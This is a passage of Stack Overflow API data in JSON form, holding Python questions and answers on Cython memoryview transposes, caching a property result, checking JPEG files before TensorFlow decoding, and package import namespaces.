1463167625, "creation_date": 1463045865, "answer_id": 37182991, "question_id": 37174074, "link": "https://stackoverflow.com/questions/37174074/cython-memoryview-transpose-typeerror/37182991#37182991", "title": "Cython memoryview transpose: Typeerror", "body": "<pre><code>self.y[...] = some_array\n# or equivalently self.y[:,:,:,:] = some_array\n</code></pre>\n\n<p>does a copy of <code>some_array</code> into <code>self.y</code>, which must already be initialised to the right size. It also only seems to work if <code>some_array</code> is already a memoryview (which doesn't hugely make sense to me, but this seems to be the case).</p>\n\n<p>(<code>self.y[:] = some_array</code> only works for 1D arrays)</p>\n\n<p>If you just want make <code>self.y</code> \"look at\" a numpy array you just want to do</p>\n\n<pre><code>self.y = some_array\n# in your case:\n# self.y = out_image.transpose(1, 0, 2, 3) \n</code></pre>\n\n<p>The chances are that the this is fine for your purposes!</p>\n\n<hr>\n\n<p>If you're particularly keen on making a copy (possibly if you've taken a C pointer to <code>self.y</code> or something like that) then you have to force <code>some_array</code> to be a memoryview. You'd do something like</p>\n\n<pre><code>cdef double[:,:,:,:] temporary_view_of_transpose\n\n# temporary_view_of_transpose now \"looks at\" the memory allocated by transpose\n# no square brackets!\ntemporary_view_of_transpose = out_image.transpose(1, 0, 2, 3)\n\n# data is copied from temporary_view_of_transpose to self.y\nself.y[...] = temporary_view_of_transpose # (remembering that self.y must be the correct shape before this assignment).\n</code></pre>\n\n<hr>\n\n<p>I agree the error message seen is unhelpful!</p>\n\n<hr>\n\n<p><strong>Edit:</strong> The following is minimum complete example that works for me (Cython 0.24, Python 3.5.1, Linux - I can't easily test on Anaconda) At this stage I'm not clear what's different in your code.</p>\n\n<pre><code># memview.pyx\ncimport numpy as np\nimport numpy as np\n\ncdef class MemviewClass:\n    cdef double[:,:,:,:] y\n\n    def __init__(self):\n        self.y = np.zeros((2,3,4,5))\n\n    def do_something(self):\n        cdef np.ndarray[np.float64_t,ndim=4] out_image = np.ones((3,2,4,5))\n        cdef double[:,:,:,:] temp\n        temp = out_image.transpose(1,0,2,3)\n        self.y[...] = temp\n\n    def print_y(self):\n        # just to check it gets changed\n        print(np.asarray(self.y))\n</code></pre>\n\n<p>and test_script.py to show it works:</p>\n\n<pre><code># use pyximport for ease of testing\nimport numpy\nimport pyximport; pyximport.install(setup_args=dict(include_dirs=numpy.get_include()))\n\nimport memview\n\na = memview.MemviewClass()\na.print_y() # prints a big array of 0s\na.do_something()\na.print_y() # prints a big array of 1s\n</code></pre>\n"}], "owner": {"reputation": 18483, "user_id": 497600, "user_type": "registered", "accept_rate": 81, "profile_image": "https://www.gravatar.com/avatar/9d2bd51b0d7a3e483cb42919119d2e8d?s=128&d=identicon&r=PG", "display_name": "lhk", "link": "https://stackoverflow.com/users/497600/lhk"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 439, "favorite_count": 0, "accepted_answer_id": 37182991, "answer_count": 1, "score": 1, "last_activity_date": 1463167625, "creation_date": 1463004430, "last_edit_date": 1463123343, "question_id": 37174074, "link": "https://stackoverflow.com/questions/37174074/cython-memoryview-transpose-typeerror", "title": "Cython memoryview transpose: Typeerror", "body": "<p>I'm trying to develop a small Convolutional Neural Network framework with python.\nThe code for the convolutional node already works (slowly) and I would like to speed it up.\nThe hotspots are the loops where the convolutional filter is moved across the image. I chose to use cython to speed up those loops.</p>\n\n<p>The obvious small annotations, cdef for all local variables and removing boundscheck, shaved hardly 10% off of my runtime. That seemed strange to me, based on what I read online, cython should already be able to do its magic.</p>\n\n<p>Unfortunately the code is inside a class and relies heavily on the properties of that class. I decided to convert it into a cdef class. This means that all class attributes have to be declared with cdef. Apparently cython doesn't support numpy arrays, so I declared all numpy arrays as <code>double[:,:,...]</code></p>\n\n<p>So far the code worked fine, all unittests passing. Now the compilation to .pyd (I'm working under windows) still works. But running the code creates a Typeerror:</p>\n\n<blockquote>\n  <p>TypeError: only length-1 arrays can be converted to Python scalars</p>\n</blockquote>\n\n<p>Here is some code. This is the entire forward method of my convolutional node, which might be too much and not easily readable. You probably only need the very last line. That's were the error happens:</p>\n\n<pre><code>    @cython.boundscheck(False)\n    @cython.nonecheck(False)\n    def forward(self):\n\n        # im2col: x -&gt; in_cols\n        # padding\n        cdef np.ndarray[DTYPE_t, ndim=4] x_padded = np.zeros((self.batch_size, self.in_colors, self.in_width + self.padding*2, self.in_height + self.padding*2))\n        if self.padding&gt;0:\n            x_padded[:, :, self.padding:self.in_width+self.padding, self.padding:self.in_height+self.padding] = self.x\n        else:\n            x_padded[:]=self.x\n\n        # allocating new field\n        cdef np.ndarray[DTYPE_t, ndim=4] rec_fields = np.empty((self.filter_size**2* self.in_colors, self.batch_size, self.out_width, self.out_height))\n\n        # copying receptive fields\n        cdef int w,h\n        for w, h in np.ndindex((self.out_width, self.out_height)):\n            rec_fields[:, :, w, h] = x_padded[:, :, w*self.stride:w*self.stride + self.filter_size, h*self.stride:h*self.stride + self.filter_size] \\\n                .reshape((self.batch_size, self.filter_size**2* self.in_colors)) \\\n                .T\n\n        self.in_cols = rec_fields.reshape((self.filter_size**2 * self.in_colors, self.batch_size * self.out_width * self.out_height))\n\n        # linear node: in_cols -&gt; out_cols\n        cdef np.ndarray[DTYPE_t, ndim=2] out_cols=np.dot(self.W,self.in_cols)+self.b\n\n        # col2im: out_cols -&gt; out_image -&gt; y\n        cdef np.ndarray[DTYPE_t, ndim=4] out_image = out_cols.reshape((self.out_colors, self.batch_size, self.out_width, self.out_height))\n        self.y[:] = out_image.transpose(1, 0, 2, 3)\n</code></pre>\n\n<p>This last call to transpose is marked in the exception. I can't explain this. Do memoryviews behave differently when transposed ?</p>\n\n<p>UPDATE:</p>\n\n<p>I'm sure that the dimensions are defined correctly. If there is a dimension mismatch, it produces a different runtime error. Can't check right now, but it was something like \"got 4-dim, expected 2-dim\". \nI've got to say that I'm extremely impressed by the type system of cython. This kind of runtime type information in a python exception is rather useful.\nSadly it doesn't explain why the transpose above fails.</p>\n\n<p>UPDATE:</p>\n\n<p>There's some complication with the arrays: They must not be overwritten, only be used as references.</p>\n\n<p>A little difficult to explain:\nAt the core of the neural network is a loop which calls the method forward() on all nodes in the network consecutively. </p>\n\n<pre><code>for node in self.nodes:\n    node.forward()\n</code></pre>\n\n<p>In this method the node looks at its input data, makes some computations and writes to its output. It relies on the fact that the input already contains the correct data.</p>\n\n<p>For the setup of my network I store the nodes in the right order. And I connect them manually.</p>\n\n<pre><code>node2.x=node1.y\n</code></pre>\n\n<p>Now if I write</p>\n\n<pre><code>self.y[:]= data\n</code></pre>\n\n<p>in the forward method of node1, node2 automatically has the correct input.\nThis requires careful programming: the forward methods must be called in the right order and the output must never be overwritten, only written to.</p>\n\n<p>The alternative would be a huge structure where I store the output of each node and pass this data around. That would create lots of boilerplate code and mess up the forward and backward pass.</p>\n\n<p>UPDATE:</p>\n\n<p>the last few lines in forward now look like this:</p>\n\n<pre><code>cdef np.ndarray[DTYPE_t, ndim=4] out_image = out_cols.reshape((self.out_colors, self.batch_size, self.out_width, self.out_height))\n        cdef double[:,:,:,:] temp\n        temp=out_image.transpose(1,0,2,3)\n        self.y[...] = temp\n</code></pre>\n\n<p>The assignment to temp fails with the same TypeError message.</p>\n"}, {"tags": ["python", "class", "oop"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 4, "creation_date": 1463004327, "post_id": 37174008, "comment_id": 61882764, "body": "Check out <a href=\"https://github.com/pydanny/cached-property\" rel=\"nofollow noreferrer\">github.com/pydanny/cached-property</a>"}, {"owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "edited": false, "score": 2, "creation_date": 1463004405, "post_id": 37174008, "comment_id": 61882793, "body": "How about initializing the object with <code>self._result = None</code>, and then in <code>calculate</code> you first check whether <code>self._result</code> already has a value before calculating a new one?"}, {"owner": {"reputation": 8909, "user_id": 467366, "user_type": "registered", "accept_rate": 70, "profile_image": "https://i.stack.imgur.com/fYQGf.jpg?s=128&g=1", "display_name": "Paul", "link": "https://stackoverflow.com/users/467366/paul"}, "edited": false, "score": 1, "creation_date": 1463009930, "post_id": 37174008, "comment_id": 61884531, "body": "I personally wouldn&#39;t use <code>@property</code> here because logically you expect something called &quot;calculate&quot; to be a function that does work."}], "answers": [{"comments": [{"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1463005112, "post_id": 37174077, "comment_id": 61883063, "body": "You can&#39;t really detect such modifications, though."}, {"owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "reply_to_user": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1463005174, "post_id": 37174077, "comment_id": 61883085, "body": "I would make a property out of <code>x</code> and <code>y</code>. Check my update."}, {"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1463005373, "post_id": 37174077, "comment_id": 61883166, "body": "Sure, you can detect setting the properties easily enough (as long as the user doesn&#39;t bypass the property), but I was thinking more along the lines of the user just mutating the arrays they passed in."}, {"owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "reply_to_user": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 0, "creation_date": 1463005529, "post_id": 37174077, "comment_id": 61883224, "body": "I see your point. Since the arrays are references they may be modified outside of the scope of <code>MyClass</code>. I admit that I&#39;m a Python beginner, what would you suggest?"}, {"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 1, "creation_date": 1463005755, "post_id": 37174077, "comment_id": 61883310, "body": "Probably just document that the arrays shouldn&#39;t be modified. Possibly make defensive copies and mark the attributes with an underscore."}, {"owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "reply_to_user": {"reputation": 1378, "user_id": 3501751, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/cJ4g9.jpg?s=128&g=1", "display_name": "Charlie", "link": "https://stackoverflow.com/users/3501751/charlie"}, "edited": false, "score": 0, "creation_date": 1463006947, "post_id": 37174077, "comment_id": 61883691, "body": "@Charlie It caches <i>one</i> result. That should be good for majority of usage patterns. If it is desired to cache multiple results, a lookup table can be used, yes."}, {"owner": {"reputation": 1378, "user_id": 3501751, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/cJ4g9.jpg?s=128&g=1", "display_name": "Charlie", "link": "https://stackoverflow.com/users/3501751/charlie"}, "edited": false, "score": 0, "creation_date": 1463008430, "post_id": 37174077, "comment_id": 61884122, "body": "@hek2mgl - Now I&#39;m curious - can you please point me to an example where only a single value is cached? I though caching was storing a value somewhere that made it faster to retrieve. By that definition I don&#39;t see this answer accomplishing that."}, {"owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "edited": false, "score": 0, "creation_date": 1463031715, "post_id": 37174077, "comment_id": 61890330, "body": "The first time <code>calculation()</code> is called the calculation happens and the result will be stored/cached in <code>self._result</code>. On subsequent calls to <code>calculation()</code> the result will be read from that variable/cache."}], "tags": [], "owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "is_accepted": false, "score": 1, "last_activity_date": 1463006227, "last_edit_date": 1463006227, "creation_date": 1463004449, "answer_id": 37174077, "question_id": 37174008, "link": "https://stackoverflow.com/questions/37174008/pythonic-way-to-store-a-method-result-as-an-attribute/37174077#37174077", "title": "Pythonic way to store a method result as an attribute", "body": "<p>Basically that looks good. But since <code>x</code> and <code>y</code> are mutable, you will need to invalidate <code>_result</code> in case <code>x</code> and <code>y</code> will get modified.</p>\n\n<p>I would make properties out of <code>x</code> and <code>y</code> as well and once they will be set invalidate <code>_result</code>.</p>\n\n<p>One thing, since <code>x</code> and <code>y</code> are references to <code>lists</code> (I guess you meant that when saying <code>arrays</code>), these lists might get modified from outside of the scope of <code>MyClass</code>. If that happens, following my suggestion to use properties, <code>MyClass</code> won't be able to detect that changes even if <code>x</code> and <code>y</code> are properties. I would live with that restriction but document it well.</p>\n"}, {"tags": [], "owner": {"reputation": 44584, "user_id": 2617068, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/0nSBO.png?s=128&g=1", "display_name": "TigerhawkT3", "link": "https://stackoverflow.com/users/2617068/tigerhawkt3"}, "is_accepted": false, "score": 0, "last_activity_date": 1463005237, "creation_date": 1463005237, "answer_id": 37174242, "question_id": 37174008, "link": "https://stackoverflow.com/questions/37174008/pythonic-way-to-store-a-method-result-as-an-attribute/37174242#37174242", "title": "Pythonic way to store a method result as an attribute", "body": "<p>You could initialize the object to <code>None</code> and then check whether it's still <code>None</code>:</p>\n\n<pre><code>class MyClass:\n    def __init__(self, x, y):\n        \"\"\"Input variables are two large data arrays\"\"\"\n        self.x = x\n        self.y = y\n        self._result = None\n\n    @property\n    def calculate(self):\n        \"\"\"Some computationally expensive operation\"\"\"\n        if self._result is not None:\n            return self._result\n        # if not, calculate it\n        self._result = self.x * self.y\n        return self._result\n</code></pre>\n"}, {"comments": [{"owner": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "edited": false, "score": 0, "creation_date": 1463005650, "post_id": 37174285, "comment_id": 61883275, "body": "This is reliably detecting when the result needs to get recalculated, yes. However, when x and y are large arrays, the additional memory consumption for the copies and the effort for the comparisons should not be underestimated."}, {"owner": {"reputation": 10506, "user_id": 5520354, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/QgGFm.jpg?s=128&g=1", "display_name": "C14L", "link": "https://stackoverflow.com/users/5520354/c14l"}, "reply_to_user": {"reputation": 132964, "user_id": 171318, "user_type": "registered", "accept_rate": 100, "profile_image": "https://i.stack.imgur.com/ePRKy.jpg?s=128&g=1", "display_name": "hek2mgl", "link": "https://stackoverflow.com/users/171318/hek2mgl"}, "edited": false, "score": 0, "creation_date": 1463005762, "post_id": 37174285, "comment_id": 61883314, "body": "Of course, all depends on the data size and usage. It may also be a good idea to remember more than one past result and build a storage list of past &quot;x, y, result&quot; dicts."}, {"owner": {"reputation": 1378, "user_id": 3501751, "user_type": "registered", "accept_rate": 75, "profile_image": "https://i.stack.imgur.com/cJ4g9.jpg?s=128&g=1", "display_name": "Charlie", "link": "https://stackoverflow.com/users/3501751/charlie"}, "edited": false, "score": 0, "creation_date": 1463006961, "post_id": 37174285, "comment_id": 61883694, "body": "I don&#39;t see any way around remembering x and y. How can you cache something without knowing the lookup? If x and y are &lt; 100K list of floats that&#39;s ~1MB of memory. If they&#39;re bigger than that than you should implement the cache using something other than Python i.e. there&#39;s no easy way to cache 1M+ records."}, {"owner": {"reputation": 31791, "user_id": 529630, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/2c2dd297abe572bd192b1f01322dec83?s=128&d=identicon&r=PG", "display_name": "Dunes", "link": "https://stackoverflow.com/users/529630/dunes"}, "edited": false, "score": 0, "creation_date": 1463046781, "post_id": 37174285, "comment_id": 61899814, "body": "I think a better solution would be to make x and y properties that invalid the cache every time they are set (as well as setting the values of x or y)."}], "tags": [], "owner": {"reputation": 10506, "user_id": 5520354, "user_type": "registered", "accept_rate": 50, "profile_image": "https://i.stack.imgur.com/QgGFm.jpg?s=128&g=1", "display_name": "C14L", "link": "https://stackoverflow.com/users/5520354/c14l"}, "is_accepted": false, "score": 3, "last_activity_date": 1463005681, "last_edit_date": 1463005681, "creation_date": 1463005481, "answer_id": 37174285, "question_id": 37174008, "link": "https://stackoverflow.com/questions/37174008/pythonic-way-to-store-a-method-result-as-an-attribute/37174285#37174285", "title": "Pythonic way to store a method result as an attribute", "body": "<p>You need to remember the values for x and y that were used to calculate the cached result. If they change, you need to re-calculate and refresh the cache.</p>\n\n<pre><code>class MyClass:\n    def __init__(self, x, y):\n        \"\"\"Input variables are two large data arrays\"\"\"\n        self.x = x\n        self.y = y\n        self._calculate = None\n        self._x = None\n        self._y = None\n\n    @property\n    def calculate(self):\n        if not self._calculate or self._x != self.x or self._y != self.y:\n            self._calculate = self.x * self.y\n            self._x = self.x\n            self._y = self.x\n\n        return self._calculate\n\n\n&gt;&gt;&gt; a = MyClass(2,3)\n&gt;&gt;&gt; print(a.calculate)\n6\n&gt;&gt;&gt; a.x = 553\n&gt;&gt;&gt; print(a.calculate)\n1659\n</code></pre>\n"}, {"tags": [], "owner": {"reputation": 31791, "user_id": 529630, "user_type": "registered", "accept_rate": 86, "profile_image": "https://www.gravatar.com/avatar/2c2dd297abe572bd192b1f01322dec83?s=128&d=identicon&r=PG", "display_name": "Dunes", "link": "https://stackoverflow.com/users/529630/dunes"}, "is_accepted": false, "score": 3, "last_activity_date": 1463006509, "creation_date": 1463006509, "answer_id": 37174464, "question_id": 37174008, "link": "https://stackoverflow.com/questions/37174008/pythonic-way-to-store-a-method-result-as-an-attribute/37174464#37174464", "title": "Pythonic way to store a method result as an attribute", "body": "<p>The way you've implemented your property is just fine. It works, and has near zero overhead.</p>\n\n<p>As a thought experiment you could take advantage of a specific property of non-data descriptors. A non-data descriptor is similar to <code>property</code> (which is a data descriptor). A non-data descriptor is an object that defines a <code>__get__</code> method only. When the instance has an attribute with the same name as a the non-data descriptor this overrides the non-data descriptor (think monkey patching functions). eg.</p>\n\n<pre><code>class cache:\n    def __init__(self, func):\n        self.func = func\n\n    def __get__(self, obj, type_):\n        if obj is None:\n            return self.func\n        value = self.func(obj)\n        setattr(obj, self.func.__name__, value)\n        return value\n\nclass MyClass:\n    def __init__(self, x, y):\n        self.x = x\n        self.y = y\n\n    @cache\n    def calculate(self):\n        print(\"calculating\")\n        return self.x + self.y\n\no = MyClass(1, 2)\nprint(\"first\", o.calculate) # prints \"calcutating\" then \"first 3\"\nprint(\"second\", o.calculate) # just prints \"second 3\"\ndel o.calculate\nprint(\"third\", o.calculate) # prints \"calcutating\" then \"third 3\"\n</code></pre>\n"}], "owner": {"reputation": 770, "user_id": 5365232, "user_type": "registered", "profile_image": "https://lh3.googleusercontent.com/-XCvs7Nt8L8c/AAAAAAAAAAI/AAAAAAAAAU8/tD9LK4OiA14/photo.jpg?sz=128", "display_name": "Denis Sergeev", "link": "https://stackoverflow.com/users/5365232/denis-sergeev"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 161, "favorite_count": 1, "answer_count": 4, "score": 5, "last_activity_date": 1463006509, "creation_date": 1463004123, "question_id": 37174008, "link": "https://stackoverflow.com/questions/37174008/pythonic-way-to-store-a-method-result-as-an-attribute", "title": "Pythonic way to store a method result as an attribute", "body": "<p>I have a python class with a property that performs an operation on large arrays. What is the best way to store the result of the method after it first was calculated without redoing the operation every time the property is accessed?</p>\n\n<p>For example:</p>\n\n<pre><code>class MyClass:\n    def __init__(self, x, y):\n        \"\"\"Input variables are two large data arrays\"\"\"\n        self.x = x\n        self.y = y\n\n    @property\n    def calculate(self):\n        \"\"\"Some computationally expensive operation\"\"\"\n        try:\n            # the result has been calculated already\n            return self._result\n        except AttributeError:\n            # if not, calculate it\n            self._result = self.x * self.y\n            return self._result\n</code></pre>\n\n<p>Usage:</p>\n\n<pre><code>&gt;&gt;&gt; foo = MyClass(2,3)\n&gt;&gt;&gt; a = foo.calculate\n&gt;&gt;&gt; print(a)\n6\n</code></pre>\n\n<p>As you can see, all I came up with so far is to have a 'hidden' attribute where the result is stored. Is there a better way to do this? Is the use of <code>@property</code> correct here?</p>\n\n<p>Thanks.</p>\n"}, {"tags": ["python", "tensorflow"], "comments": [{"owner": {"reputation": 9382, "user_id": 1168661, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/AU4We.jpg?s=128&g=1", "display_name": "aug", "link": "https://stackoverflow.com/users/1168661/aug"}, "edited": false, "score": 0, "creation_date": 1463004733, "post_id": 37173982, "comment_id": 61882928, "body": "Just clarifying you mean the image file size? Could you not use <a href=\"http://stackoverflow.com/questions/2104080/how-to-check-file-size-in-python\"><code>os.stat()</code></a>? Sorry if I misunderstand."}, {"owner": {"reputation": 6356, "user_id": 464273, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/fc922f60e1a6c34502f4d4639a3b5fce?s=128&d=identicon&r=PG", "display_name": "JohnAllen", "link": "https://stackoverflow.com/users/464273/johnallen"}, "reply_to_user": {"reputation": 9382, "user_id": 1168661, "user_type": "registered", "accept_rate": 97, "profile_image": "https://i.stack.imgur.com/AU4We.jpg?s=128&g=1", "display_name": "aug", "link": "https://stackoverflow.com/users/1168661/aug"}, "edited": false, "score": 0, "creation_date": 1463005468, "post_id": 37173982, "comment_id": 61883212, "body": "Edited with more code.  <code>os.stat()</code> doesn&#39;t work on what TF returns."}, {"owner": {"reputation": 40934, "user_id": 121687, "user_type": "registered", "accept_rate": 63, "profile_image": "https://www.gravatar.com/avatar/359b919642638c5b67555a1bc89dfd3e?s=128&d=identicon&r=PG", "display_name": "fabrizioM", "link": "https://stackoverflow.com/users/121687/fabriziom"}, "edited": false, "score": 1, "creation_date": 1463008069, "post_id": 37173982, "comment_id": 61884010, "body": "I guess the easiest solution is to have another python script that reads from the input streaming csv, cleans it up and then writes to the final csv which tensorflow then reads"}], "owner": {"reputation": 6356, "user_id": 464273, "user_type": "registered", "accept_rate": 59, "profile_image": "https://www.gravatar.com/avatar/fc922f60e1a6c34502f4d4639a3b5fce?s=128&d=identicon&r=PG", "display_name": "JohnAllen", "link": "https://stackoverflow.com/users/464273/johnallen"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 570, "favorite_count": 1, "answer_count": 0, "score": 2, "last_activity_date": 1463005428, "creation_date": 1463003933, "last_edit_date": 1463005428, "question_id": 37173982, "link": "https://stackoverflow.com/questions/37173982/how-to-verify-an-image-file-before-decoding-with-tensorflow", "title": "How to verify an image file before decoding with TensorFlow", "body": "<p>TensorFlow fails pretty hard when something isn't right.</p>\n\n<p>Say we write files to a csv somewhat continuously.  How can we check beforehand if a jpeg is valid before <code>decode_jpeg</code> fails?  We could have a file where the jpeg hasn't been fully written or some other failure.</p>\n\n<p>I've tried:</p>\n\n<p><code>image_path, label = tf.decode_csv(value, field_delim=\" \", record_defaults=record_defaults)\nprint(image_path) #Tensor not a file...\nfile = tf.read_file(\"some_fake_file.jpg\")\nsize = tf.size(file) #&lt;tf.Tensor 'Size:0' shape=() dtype=int32&gt;\nif size is not None:\n    print(\"size is not none\") # prints...\n</code></p>\n\n<p>Doing something like </p>\n\n<p><code>size = os.path.getsize(image_path)</code></p>\n\n<p>throws: <code>TypeError: coercing to Unicode: need string or buffer, Tensor found</code></p>\n\n<p>So the question is how can we ensure we're dealing with a specified-size jpeg before passing it to <code>decode_jpeg</code> so TensorFlow doesn't fail.</p>\n\n<p>Ideally we would be able to check the size and make sure the jpeg's size equals our full training image size.</p>\n"}, {"tags": ["python", "import", "module", "package", "git-submodules"], "comments": [{"owner": {"reputation": 31205, "user_id": 2482744, "user_type": "registered", "accept_rate": 52, "profile_image": "https://i.stack.imgur.com/OQPNY.png?s=128&g=1", "display_name": "Alex Hall", "link": "https://stackoverflow.com/users/2482744/alex-hall"}, "edited": false, "score": 2, "creation_date": 1463004080, "post_id": 37173968, "comment_id": 61882655, "body": "It is completely harmless and normal. Avoiding it, if possible, would be a pain and likely completely pointless."}, {"owner": {"reputation": 213464, "user_id": 2357112, "user_type": "registered", "accept_rate": 26, "profile_image": "https://www.gravatar.com/avatar/3f80897d57525afe9eac4fb8c8318052?s=128&d=identicon&r=PG", "display_name": "user2357112 supports Monica", "link": "https://stackoverflow.com/users/2357112/user2357112-supports-monica"}, "edited": false, "score": 1, "creation_date": 1463004149, "post_id": 37173968, "comment_id": 61882684, "body": "If you want, you can <code>import numpy as _np</code>. It won&#39;t hide the variable, but it&#39;ll mark it as &quot;not part of my public API&quot; and prevent <code>from pkg.test import *</code> from grabbing it."}], "owner": {"reputation": 11, "user_id": 6322642, "user_type": "registered", "profile_image": "https://www.gravatar.com/avatar/a7e415af6efc328cf9e94456b01d0bd6?s=128&d=identicon&r=PG&f=1", "display_name": "Cylarc", "link": "https://stackoverflow.com/users/6322642/cylarc"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": false, "view_count": 27, "favorite_count": 0, "answer_count": 0, "score": 1, "last_activity_date": 1463003853, "creation_date": 1463003853, "question_id": 37173968, "link": "https://stackoverflow.com/questions/37173968/preventing-packages-imported-within-my-package-from-being-imported", "title": "Preventing packages imported within my package from being imported", "body": "<p>I know the title is a little confusing, so I made an example package that illustrates exactly what I mean. The package structure is:</p>\n\n<pre><code>pkg/\n    __init__.py\n    test.py\n</code></pre>\n\n<p>In <strong>init</strong>.py:</p>\n\n<pre><code>from test import func\n</code></pre>\n\n<p>in test.py:</p>\n\n<pre><code>import numpy as np\n\ndef func(x):\n    return np.asarray(x)\n</code></pre>\n\n<p>Then, when I import my package, pkg.func() works exactly as expected</p>\n\n<pre><code>&gt;&gt;&gt; import pkg\n&gt;&gt;&gt; x=[1,2,3]\n&gt;&gt;&gt; pkg.func(x)\narray([1,2,3])\n</code></pre>\n\n<p>However, numpy is also imported as pkg.test.np, even though it wasn't specified in the <strong>init</strong>.py file!</p>\n\n<pre><code>&gt;&gt;&gt; pkg.test.np\n&lt;module 'numpy' from '/Applications/Anaconda....'&gt;\n&gt;&gt;&gt; pkg.test.np.array([1,2,3])\narray([1,2,3])\n</code></pre>\n\n<p>Is this a good thing? Is it necessary? I don't like it because it added unnecessary clutter to my packages. Is there a way to stop it?</p>\n\n<p>Thanks</p>\n"}, {"tags": ["python", "pycharm"], "answers": [{"tags": [], "owner": {"reputation": 13274, "user_id": 826532, "user_type": "registered", "accept_rate": 82, "profile_image": "https://www.gravatar.com/avatar/28a059d8fa7df4eecc9962769f23534c?s=128&d=identicon&r=PG", "display_name": "JustDanyul", "link": "https://stackoverflow.com/users/826532/justdanyul"}, "is_accepted": false, "score": 1, "last_activity_date": 1463003826, "creation_date": 1463003826, "answer_id": 37173962, "question_id": 37173936, "link": "https://stackoverflow.com/questions/37173936/why-cant-i-use-a-linux-based-python-interpreter-when-using-pycharm-on-a-windows/37173962#37173962", "title": "Why can&#39;t I use a Linux-based Python interpreter when using PyCharm on a Windows machine?", "body": "<p>You can. You can use Docker or Vagrant for doing just that.</p>\n\n<p><a href=\"https://blog.jetbrains.com/pycharm/2015/12/using-docker-in-pycharm/\" rel=\"nofollow\">https://blog.jetbrains.com/pycharm/2015/12/using-docker-in-pycharm/</a></p>\n"}], "owner": {"reputation": 1415, "user_id": 990155, "user_type": "registered", "accept_rate": 55, "profile_image": "https://www.gravatar.com/avatar/9b0b7edce16aff23e197432e1a1f41d3?s=128&d=identicon&r=PG", "display_name": "mstrom", "link": "https://stackoverflow.com/users/990155/mstrom"}, "delete_vote_count": 0, "reopen_vote_count": 0, "close_vote_count": 0, "is_answered": true, "view_count": 27, "favorite_count": 0, "answer_count": 1, "score": 1, "last_activity_date": 1463003826, "creation_date": 1463003657, "question_id": 37173936, "link": "https://stackoverflow.com/questions/37173936/why-cant-i-use-a-linux-based-python-interpreter-when-using-pycharm-on-a-windows", "title": "Why can&#39;t I use a Linux-based Python interpreter when 